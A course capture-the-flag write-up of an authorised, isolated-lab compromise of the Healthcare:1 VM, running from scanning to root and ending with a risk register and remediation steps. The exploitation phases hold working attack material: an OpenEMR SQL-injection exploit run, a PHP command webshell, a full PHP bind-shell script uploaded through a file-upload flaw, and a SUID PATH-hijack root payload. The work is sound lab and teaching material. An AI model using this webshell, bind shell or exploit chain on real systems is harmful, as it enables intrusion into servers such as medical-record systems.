# CIP-A105 CTF2 — Operation Black Forge
# Target: OPFOR-02 (Healthcare:1)

---

## Operator Information

| Field | Detail |
|-------|--------|
| Course | CIP-A105 |
| CTF Number | 2 |
| Operation Codename | Black Forge |
| Target | OPFOR-02 — Healthcare:1 (VulnHub, v1n1v131r4) |
| Attacker | Kali Linux — 192.168.254.129 |
| Target IP | 192.168.254.128 |
| Network Segment | Isolated Host-Only (VMware VMnet1) |
| Date | 2026-09-19 |

---

## Table of Contents

1. Environment Setup
2. Phase 0 — Preparation and Control
3. Phase 1 — Network and Service Discovery
4. Phase 2 — Enterprise Service Enumeration
5. Phase 3 — Exploit Chain Development
6. Phase 4 — Initial Access
7. Phase 5 — Linux Post-Exploitation
8. Phase 6 — Privilege Escalation and Objectives
9. Phase 7 — Remediation Validation and Withdrawal
10. Attack Chain Summary
11. Mission Proofs
12. Risk Register
13. Folder Structure

---

## 1. Environment Setup

### Network Configuration
Both VMs configured on VMware Host-Only network (VMnet1).
Healthcare VM has one adapter (Host-Only).
Kali VM has two adapters: NAT (eth0, internet access) and Host-Only (eth1, lab segment).

| VM | Interface | IP Address | Role |
|----|-----------|------------|------|
| Kali | eth1 | 192.168.254.129 | Attacker |
| Healthcare | eth1 | 192.168.254.128 | Target (OPFOR-02) |

### Tooling Installed
- nmap 7.99
- gobuster 3.8.2
- john v1.9
- hashcat v7.1.2
- curl
- netcat
- searchsploit (Exploit-DB local mirror)
- seclists 2025.3

---

## 2. Phase 0 — Preparation and Control

### Objective
Establish an isolated authorised lab environment before any network discovery or testing begins.

### Actions

#### ROE Review
Rules of engagement reviewed and accepted. Scope confirmed as OPFOR-02 (Healthcare.ova) on an isolated host-only network only.

#### Target Deployment
Imported Healthcare.ova into VMware Workstation. VM powered on and confirmed reaching login screen.

#### Network Isolation Troubleshooting
VMware reported host-only adapter not running. Investigated via Windows ncpa.cpl and found VMnet1 disabled. Re-enabled VMnet1, restarted VMware. Both VMs obtained addresses on 192.168.254.0/24 after fix.

#### Baseline Snapshot

VMware -> Right-click Healthcare -> Snapshot -> Take Snapshot
Name: CIP-A105-CTF2-CLEAN-BASELINE


#### Evidence Folder Created
```bash
mkdir -p ~/CIP-A105_RegNo_CTF2_Black-Forge/{01_scans,02_screenshots,03_operator_log,04_evidence_hashes,05_report_drafts,06_phase_notes}
```

---

## 3. Phase 1 — Network and Service Discovery

### Objective
Discover the target on the isolated segment and enumerate all exposed services.

### Commands and Results

#### Host Discovery
```bash
sudo nmap -sn 192.168.254.0/24
```
Result:
- 192.168.254.1 — VMware gateway
- 192.168.254.128 — TARGET (MAC: VMware)
- 192.168.254.254 — VMware DHCP service
- 192.168.254.129 — Kali attacker

#### Reachability Confirmation
```bash
ping -c 4 192.168.254.128
```
Result: 100 percent reply, 0 percent loss, avg RTT 0.45ms

#### Full TCP Port and Service Scan
```bash
sudo nmap -sV -p- 192.168.254.128 -oN 01_scans/nmap_full_tcp_phase1.txt
```
Result:

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | ProFTPD 1.3.3d |
| 80/tcp | open | http | Apache httpd 2.2.17 (PCLinuxOS 2011) |

65533 ports closed. Full scan completed in 55.27 seconds.

---

## 4. Phase 2 — Enterprise Service Enumeration

### Objective
Enumerate FTP and HTTP services to identify trust boundaries, authentication surfaces, and configuration weaknesses.

### Commands and Results

#### FTP Anonymous Login Attempt
```bash
ftp 192.168.254.128
Name: anonymous
Password: (blank)
```
Result: 530 Login incorrect. Anonymous access not permitted.
Banner: ProFTPD 1.3.3d Server (ProFTPD Default Installation)

#### HTTP Header Inspection
```bash
curl -s -D - http://192.168.254.128/ -o /dev/null
```
Result:

| Header | Value |
|--------|-------|
| Status | HTTP/1.1 200 OK |
| Server | Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011) |
| Last-Modified | Sat, 06 Jan 2018 |
| Content-Length | 5031 |

#### robots.txt Check
```bash
curl -s http://192.168.254.128/robots.txt
```
Result: Default Apache/PCLinuxOS robots.txt. Disallowed: /manual/, /manual-2.2/, /addon-modules/, /doc/, /images/, /all_our_e-mail_addresses, /admin/

#### Manual Path Verification
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.254.128/addon-modules/
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.254.128/admin/
```
Result:

| Path | Status |
|------|--------|
| /addon-modules/ | 403 Forbidden |
| /admin/ | 404 Not Found |

#### Content Discovery — Medium Wordlist
```bash
gobuster dir -u http://192.168.254.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50 -o 01_scans/gobuster_root_phase2.txt
```
Result: images, css, js, vendor, fonts, gitweb (301), phpMyAdmin (403), server-status (403)

#### Content Discovery — Large Wordlist (SecLists)
```bash
gobuster dir -u http://192.168.254.128/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,html -t 50 -o 01_scans/gobuster_root_big_phase2.txt
```
Result: All previous plus /openemr/ (301) — KEY FINDING

#### OpenEMR Application Inspection
```bash
curl -s http://192.168.254.128/openemr/
curl -s "http://192.168.254.128/openemr/interface/login/login_frame.php?site=default"
curl -s http://192.168.254.128/openemr/interface/login/login.php
```
Result:
- Redirects to interface/login/login_frame.php
- jQuery 1.4.3 in use (2010-2011 era)
- Client-side MD5 and SHA1 password hashing via JavaScript
- AJAX endpoint: validateUser.php?u= called during authentication
- Commented-out demo hint in page source: login=admin / password=pass
- PHP version disclosed in response header: PHP/5.3.3

#### Demo Credential Test
```bash
curl -s -i -c cookies.txt -X POST \
  "http://192.168.254.128/openemr/interface/main/main_screen.php?auth=login&site=default" \
  -d "authProvider=Default&authUser=admin&clearPass=pass&authPass=&languageChoice=1"
```
Result: 302 redirect to login_screen.php?error=1 — credentials not active.

#### Attack Surface Summary

| Service | Port | Version | Finding |
|---------|------|---------|---------|
| FTP | 21 | ProFTPD 1.3.3d | Anonymous access denied, EOL version |
| HTTP | 80 | Apache 2.2.17 | OpenEMR at /openemr/, phpMyAdmin present |
| OpenEMR | 80 | 4.1.0 (indicators) | Login portal, validateUser.php AJAX endpoint |
| PHP | — | 5.3.3 | EOL since 2014, disclosed in header |

---

## 5. Phase 3 — Exploit Chain Development

### Objective
Research applicable vulnerabilities and construct a technically defensible attack chain.

### Commands and Results

#### Vulnerability Research
```bash
searchsploit openemr
searchsploit proftpd 1.3.3
searchsploit -x php/webapps/49742.py
searchsploit -x php/webapps/17998.txt
searchsploit -x php/remote/24529.rb
searchsploit -x php/webapps/28329.txt
```

#### ProFTPD Analysis
All known CVEs for ProFTPD target versions 1.3.3c and below. The 1.3.3d release was issued specifically to remove the backdoor present in 1.3.3c. ProFTPD ruled out as attack vector.

#### OpenEMR Version Filtering
Version indicators (jQuery 1.4.3, PHP 5.3.3, PCLinuxOS 2011, validateUser.php AJAX endpoint) are consistent with OpenEMR 4.1.0.

#### Primary Vector Selected — 49742.py

Exploit: OpenEMR 4.1.0 - u SQL Injection
Endpoint: /openemr/interface/login/validateUser.php?u=
Auth required: None
Type: Time-based blind SQL injection
Impact: Extracts username and password hashes unauthenticated
Correlation: validateUser.php?u= confirmed present in login.php source during Phase 2


#### Secondary Vector — manage_site_files.php (28329.txt)

Exploit: OpenEMR 4.1.1 Patch 14 - Arbitrary File Upload
Endpoint: /openemr/interface/super/manage_site_files.php
Auth required: Yes (authenticated admin session)
Type: Unrestricted file upload
Impact: Upload arbitrary PHP file to web-accessible directory


#### Openflashchart Upload Path — Ruled Out
```bash
curl -s -i http://192.168.254.128/openemr/library/openflashchart/tmp-upload-images/
```
Result: 404 — directory does not exist. Upload vector not viable.

### Final Attack Chain

| Stage | Action | Vector |
|-------|--------|--------|
| 1 | Unauthenticated SQLi -> extract hashes | 49742.py on validateUser.php |
| 2 | Crack SHA1 hashes | john/hashcat + rockyou.txt |
| 3 | Authenticate to OpenEMR | Pre-hashed authPass in POST |
| 4 | Upload PHP bind shell | manage_site_files.php |
| 5 | Establish shell via nc | bindshell2.php + nc |
| 6 | Escalate via SUID healthcheck | PATH hijack |

---

## 6. Phase 4 — Initial Access

### Objective
Establish an authorised foothold through discovered network-facing weaknesses.

### Commands and Results

#### Step 1 — SQL Injection Credential Extraction
```bash
cp /usr/share/exploitdb/exploits/php/webapps/49742.py ~/CIP-A105_RegNo_CTF2_Black-Forge/
# Edited url line to: http://192.168.254.128/openemr/interface/login/validateUser.php?u=
python3 ~/CIP-A105_RegNo_CTF2_Black-Forge/49742.py
```
Result:

[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d


#### Step 2 — Hash Cracking
```bash
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt 04_evidence_hashes/openemr_hashes.txt
hashcat -m 100 04_evidence_hashes/openemr_hashes.txt /usr/share/wordlists/rockyou.txt
```
Result: Both cracked in under 1 second (7.24 percent of rockyou.txt):

| Username | Hash | Plaintext |
|----------|------|-----------|
| admin | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 | ackbar |
| medical | ab24aed5a7c4ad45615cd7e0da816eea39e4895d | medical |

#### Step 3 — Authentication (Pre-Hashed authPass)
Note: Application hashes password client-side via JavaScript before submission. clearPass field is cleared before POST. Server validates authPass only.

```bash
curl -s -i -c admin_cookies.txt -X POST \
  "http://192.168.254.128/openemr/interface/main/main_screen.php?auth=login&site=default" \
  -d "authProvider=Default&authUser=admin&clearPass=&authPass=3863efef9ee2bfbc51ecdca359c6302bed1389e8&languageChoice=1"
```
Result: HTTP 200 OK — admin session established.

#### Step 4 — Webshell Upload via manage_site_files.php
```bash
cat > /home/kali/CIP-A105_RegNo_CTF2_Black-Forge/shell.php << 'SHELL'
<?php echo shell_exec($_GET['cmd']); ?>
SHELL

curl -s -i -b admin_cookies.txt -X POST \
  -F "form_image=@/home/kali/CIP-A105_RegNo_CTF2_Black-Forge/shell.php;type=text/php" \
  -F "bn_save=Save" \
  "http://192.168.254.128/openemr/interface/super/manage_site_files.php"
```
Result: HTTP 200 OK — shell.php confirmed in destination dropdown, uploaded to /var/www/html/openemr/sites/default/images/

#### Step 5 — RCE Confirmation
```bash
curl -s "http://192.168.254.128/openemr/sites/default/images/shell.php?cmd=id"
curl -s "http://192.168.254.128/openemr/sites/default/images/shell.php?cmd=uname+-a"
```
Result:

Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686


#### Step 6 — Bind Shell for Interactive Access
```bash
# Create PHP bind shell
cat > /home/kali/CIP-A105_RegNo_CTF2_Black-Forge/bindshell2.php << 'BSHELL'
<?php
set_time_limit(0);
$server = stream_socket_server("tcp://0.0.0.0:5555", $errno, $errstr);
if (!$server) { die("$errstr ($errno)"); }
$client = stream_socket_accept($server, -1);
while (!feof($client)) {
    $cmd = fgets($client);
    $output = shell_exec($cmd);
    fwrite($client, $output);
}
fclose($client);
fclose($server);
?>
BSHELL

# Upload bind shell (re-authenticate if session expired)
curl -s -i -b admin_cookies.txt -X POST \
  -F "form_image=@/home/kali/CIP-A105_RegNo_CTF2_Black-Forge/bindshell2.php;type=text/php" \
  -F "bn_save=Save" \
  "http://192.168.254.128/openemr/interface/super/manage_site_files.php"

# Terminal 1 — trigger bind shell
curl -s "http://192.168.254.128/openemr/sites/default/images/bindshell2.php"

# Terminal 2 — connect
nc 192.168.254.128 5555
```
Result: Interactive shell obtained as apache (uid=479).

Note: Outbound reverse shell attempts failed due to Shorewall firewall blocking outbound TCP. Bind shell (inbound connection to target) bypassed this restriction.

---

## 7. Phase 5 — Linux Post-Exploitation

### Objective
Enumerate host identity, users, groups, sudo rights, SUID/SGID files, scheduled jobs, services, network connections, and filesystem permissions.

### Commands and Results (executed via bind shell)

#### Host Identity
```bash
uname -a
cat /etc/issue
hostname
```
Result:

| Attribute | Value |
|-----------|-------|
| Hostname | localhost.localdomain |
| OS | ZEN-mini release 2011 (PCLinuxOS) |
| Kernel | 2.6.38.8-pclos3.bfs |
| Architecture | 32-bit i686 |

#### User Enumeration
```bash
cat /etc/passwd | grep -v nologin | grep -v false
last
```
Result — Interactive users:

| Username | UID | Shell | Notes |
|----------|-----|-------|-------|
| root | 0 | /bin/bash | Primary target |
| mysql | 492 | /bin/bash | Service account, unusual to have bash |
| medical | 500 | /bin/bash | Matches cracked credential |
| almirant | 501 | /bin/bash | Primary workstation user |

#### Sudo Rights
```bash
sudo -l
```
Result: No output — apache has no sudo rights.

#### SUID/SGID Files
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
Key finding: /usr/bin/healthcheck appears in both lists

-rwsr-sr-x 1 root root 5813 Jul 29 2020 /usr/bin/healthcheck

Custom non-standard binary with both SUID and SGID bits set, owned by root.

#### Running Services
```bash
ls /etc/init.d/
ps aux
```
Key services: httpd, mysqld, sshd, proftpd, crond, shorewall

Note: Shorewall firewall confirmed active — explains blocked reverse shell attempts.

#### Credentials in Config Files
```bash
cat /var/www/html/openemr/sites/default/sqlconf.php
```
Result: MySQL credentials in plaintext:

host: localhost
login: openemr
pass: openemr
database: openemr


#### Scheduled Jobs
```bash
cat /etc/crontab
```
Result: Standard system cron only (hourly, daily, weekly, monthly). No custom jobs. No user crontabs.

#### Network State
```bash
ifconfig
```
Result: Single interface eth1 at 192.168.254.128, loopback only. No secondary network segments.

---

## 8. Phase 6 — Privilege Escalation and Objectives

### Objective
Identify and validate a privilege escalation path. Reach root. Collect mission proofs.

### Analysis of /usr/bin/healthcheck

```bash
strings /usr/bin/healthcheck
```
Result — binary executes via system():

clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h


All commands called without absolute paths. Binary uses system() which inherits the caller's PATH environment variable. Since the binary is SUID root, any command it executes via system() runs as root.

### Exploitation — PATH Hijack

```bash
# Step 1 — create malicious ifconfig payload
echo 'cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash' > /tmp/ifconfig
chmod +x /tmp/ifconfig

# Step 2 — prepend /tmp to PATH and execute in same environment
export PATH=/tmp:$PATH ; /usr/bin/healthcheck

# Step 3 — verify SUID rootbash created
ls -la /tmp/rootbash
# Result: -rwsrwxrwx 1 root root 864208 Sep 19 17:23 /tmp/rootbash

# Step 4 — execute as root
/tmp/rootbash -p -c 'id'
# Result: uid=479(apache) gid=416(apache) euid=0(root) groups=0(root),416(apache)
```

Root achieved via euid=0.

### Mission Proofs

```bash
/tmp/rootbash -p -c 'cat /root/root.txt'
/tmp/rootbash -p -c 'cat /home/almirant/user.txt'
```

| Flag | Location | Value |
|------|----------|-------|
| user.txt | /home/almirant/user.txt | d41d8cd98f00b204e9800998ecf8427e |
| root.txt | /root/root.txt | eaff25eaa9ffc8b62e3dfebf70e83a7b |

---

## 9. Phase 7 — Remediation Validation and Withdrawal

### Session Cleanup

```bash
# Remove artifacts from target via rootbash
/tmp/rootbash -p -c 'rm /tmp/rootbash /tmp/ifconfig /tmp/f /tmp/exploit.sh'

# Remove webshells via curl
curl -s "http://192.168.254.128/openemr/sites/default/images/shell.php?cmd=rm+/var/www/html/openemr/sites/default/images/shell.php"
curl -s "http://192.168.254.128/openemr/sites/default/images/bindshell2.php?cmd=rm+/var/www/html/openemr/sites/default/images/bindshell2.php"
```

Restore Healthcare VM to clean baseline snapshot: CIP-A105-CTF2-CLEAN-BASELINE

---

## 10. Attack Chain Summary
```
[Kali 192.168.254.129]
|
| HTTP GET
v
[validateUser.php?u= — Blind SQLi]
|
| Extracted SHA1 hashes
v
[john/hashcat + rockyou.txt]
|
| admin:ackbar
v
[manage_site_files.php — Authenticated File Upload]
|
| bindshell2.php uploaded to /sites/default/images/
v
[nc 192.168.254.128 5555 — Bind Shell]
|
| apache uid=479
v
[strings /usr/bin/healthcheck — PATH Hijack identified]
|
| /tmp/ifconfig payload + export PATH=/tmp:$PATH
v
[/usr/bin/healthcheck — SUID execution]
|
| euid=0(root)
v
[/tmp/rootbash -p -c 'cat /root/root.txt']
|
v
[root flag: eaff25eaa9ffc8b62e3dfebf70e83a7b]

```
---

## 11. Mission Proofs

| Proof | Value |
|-------|-------|
| user flag | d41d8cd98f00b204e9800998ecf8427e |
| root flag | eaff25eaa9ffc8b62e3dfebf70e83a7b |
| Root evidence | euid=0(root) via /tmp/rootbash -p |
| Entry point | /openemr/interface/login/validateUser.php?u= |
| Privilege escalation | /usr/bin/healthcheck SUID PATH hijack |

---

## 12. Risk Register

| ID | Finding | Asset | Likelihood | Impact | Severity | Evidence | Remediation |
|----|---------|-------|------------|--------|----------|----------|-------------|
| R1 | Unauthenticated SQL Injection | validateUser.php | High | Critical | Critical | 49742.py output, cracked hashes | Upgrade OpenEMR, parameterise queries |
| R2 | Weak and default credentials | OpenEMR user accounts | High | High | High | john/hashcat results, rockyou crack in under 1s | Enforce password policy, rotate all credentials |
| R3 | Authenticated arbitrary file upload | manage_site_files.php | High | High | High | shell.php and bindshell2.php upload confirmation | Whitelist extensions, disable PHP execution in upload dir |
| R4 | SUID binary PATH hijack | /usr/bin/healthcheck | High | Critical | Critical | strings output, rootbash creation, euid=0 confirmed | Remove SUID bit, rewrite with absolute paths |
| R5 | End-of-life server stack | Entire host | High | High | High | Apache 2.2.17, PHP 5.3.3, Kernel 2.6.38.8, PCLinuxOS 2011 | Migrate to supported OS and stack |
| R6 | Plaintext database credentials | sqlconf.php | Medium | Medium | Medium | cat sqlconf.php output | Rotate credentials, restrict file permissions |
| R7 | phpMyAdmin exposed | Port 80 /phpMyAdmin/ | Medium | Medium | Medium | gobuster result 403 | Remove or restrict to management network |
| R8 | ProFTPD EOL and unnecessary exposure | Port 21 | Low | Low | Low | nmap service scan | Disable FTP, use SFTP via existing sshd |

---

## 13. Detailed Remediation Steps

### R1 — SQL Injection in validateUser.php

Step 1: Upgrade OpenEMR to version 4.1.3 or later which patches the u parameter injection.
Step 2: Replace all raw string concatenation in database queries with prepared statements using PDO or MySQLi.
Step 3: Implement input validation on the u parameter to reject SQL metacharacters as an interim WAF rule.
Step 4: Validate fix by re-running 49742.py and confirming it no longer extracts data.

### R2 — Weak Credentials

Step 1: Immediately reset admin password to a minimum 16-character random passphrase.
Step 2: Immediately reset medical password (currently set to the username itself).
Step 3: Implement OpenEMR password policy: minimum 12 characters, mixed case, numbers, symbols.
Step 4: Enable account lockout after 5 failed attempts.
Step 5: Remove the commented-out demo credential block from login.php source code.
Step 6: Validate by running hashcat against new hashes with rockyou.txt and confirming no crack.

### R3 — Arbitrary File Upload

Step 1: Modify manage_site_files.php to whitelist permitted upload extensions: gif, jpg, png only.
Step 2: Add server-side MIME type validation in addition to extension checking.
Step 3: Configure Apache to disable PHP execution in the images upload directory:

<Directory /var/www/html/openemr/sites/default/images>
php_flag engine off
</Directory>

Step 4: Restrict access to manage_site_files.php by IP address (management host only).
Step 5: Validate by attempting to upload a .php file and confirming rejection or non-execution.

### R4 — SUID Healthcheck PATH Hijack

Step 1: Remove SUID and SGID bits immediately:
```bash
chmod 0755 /usr/bin/healthcheck
```
Step 2: Rewrite the binary source to use absolute paths for all system calls:

/usr/bin/clear
/bin/echo
/bin/sleep
/sbin/ifconfig
/sbin/fdisk
/usr/bin/du

Step 3: If the binary serves no active business function, remove it entirely:
```bash
rm /usr/bin/healthcheck
```
Step 4: Audit all SUID/SGID binaries and remove elevated permissions from any not operationally required:
```bash
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```
Step 5: Validate by re-running the PATH hijack and confirming no elevated execution occurs.

### R5 — End-of-Life Server Stack

Step 1: Plan migration to a supported OS (Ubuntu 24.04 LTS or equivalent).
Step 2: Deploy OpenEMR on PHP 8.x and Apache 2.4.x on the new host.
Step 3: Test OpenEMR functionality on the new stack in a staging environment before cutover.
Step 4: Apply all OS package updates as an interim measure on the current host.
Step 5: Establish a patch management schedule: OS patches monthly, application patches within 30 days of release.
Step 6: Validate by running nmap service version scan and confirming updated versions.

### R6 — Plaintext Database Credentials

Step 1: Change the MySQL openemr account password to a strong unique value:
```sql
ALTER USER 'openemr'@'localhost' IDENTIFIED BY '<new-strong-password>';
```
Step 2: Update sqlconf.php with the new password.
Step 3: Restrict file permissions on sqlconf.php:
```bash
chmod 640 /var/www/html/openemr/sites/default/sqlconf.php
chown root:apache /var/www/html/openemr/sites/default/sqlconf.php
```
Step 4: Restrict the openemr MySQL account to minimum required privileges:
```sql
REVOKE ALL PRIVILEGES ON *.* FROM 'openemr'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON openemr.* TO 'openemr'@'localhost';
```
Step 5: Validate by confirming file is not readable by world and MySQL account cannot access other databases.

### R7 — phpMyAdmin Exposed

Step 1: Determine whether phpMyAdmin is operationally required.
Step 2: If not required, remove it entirely:
```bash
rm -rf /var/www/html/phpMyAdmin
```
Step 3: If required, restrict access to localhost or management IP only via Apache:

<Directory /var/www/html/phpMyAdmin>
Order Deny,Allow
Deny from all
Allow from 127.0.0.1
</Directory>

Step 4: Ensure phpMyAdmin version is current and patched if retained.
Step 5: Validate by confirming the path returns 403 or is unreachable from the attacker segment.

### R8 — ProFTPD Unnecessary Exposure

Step 1: Determine whether FTP is required for any business function.
Step 2: If not required, disable and remove ProFTPD:
```bash
service proftpd stop
chkconfig proftpd off
```
Step 3: If file transfer is required, use SFTP via the existing sshd service which is already running.
Step 4: Verify port 21 is closed after removal:
```bash
nmap -p 21 192.168.254.128
```

---

## 14. Folder Structure
```
CIP-A105_RegNo_CTF2_Black-Forge/
├── README.md <- This file
├── setup_project.sh <- Project scaffolding script
├── 49742.py <- OpenEMR SQLi exploit (modified)
├── shell.php <- Command webshell
├── bindshell2.php <- PHP bind shell
├── revshell.php <- PHP reverse shell (attempted)
├── 01_scans/
│ ├── nmap_full_tcp_phase1.txt
│ ├── gobuster_root_phase2.txt
│ ├── gobuster_root_lowercase_phase2.txt
│ ├── gobuster_root_big_phase2.txt
│ └── searchsploit_openemr_phase3.txt
├── 02_screenshots/
│ ├── phase0_baseline_snapshot.png
│ ├── phase6_rootbash_id.png
│ └── phase6_root_flag.png
├── 03_operator_log/
│ └── operator_log.md
├── 04_evidence_hashes/
│ ├── openemr_hashes.txt
│ └── openemr_cracked_creds.txt
├── 05_report_drafts/
└── 06_phase_notes/
├── README.md
├── phase0_preparation.md
├── phase1_discovery.md
├── phase2_enumeration.md
├── phase3_exploit_dev.md
├── phase4_initial_access.md
├── phase5_post_exploitation.md
├── phase6_privesc.md
└── phase7_remediation.md

```
---

*Operation Black Forge — Completed 2026-09-19*
*All findings documented, mission objectives achieved, clean baseline available for restoration.*
